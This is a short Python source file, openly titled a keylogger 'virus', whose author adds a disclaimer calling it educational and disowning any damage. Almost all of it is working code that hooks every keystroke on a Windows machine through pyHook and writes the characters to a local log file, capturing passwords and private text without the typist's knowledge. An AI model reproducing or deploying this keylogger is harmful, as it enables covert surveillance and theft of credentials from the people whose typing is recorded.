#Python Keylogger Virus
#Created By VoDkAdRiNkErBoI
#If This Code Is Used For Any Malicious Purposes Then I Do Not Accept Responsiblity For Any Damages Caused
#This Is For Purely Educational Purposes (See Above)
#All The Stuff Above (Excluding #Python Keylogger Virus) Apply To The .bat File That Accompanies This File

import pyHook, pythoncom, sys, logging

file_log='Z:\Cheeki Breeki\Keylogger\\log.txt'

def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager=pyHook.HookManager()

hooks_manager.KeyDown=onKeyboardEvent

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
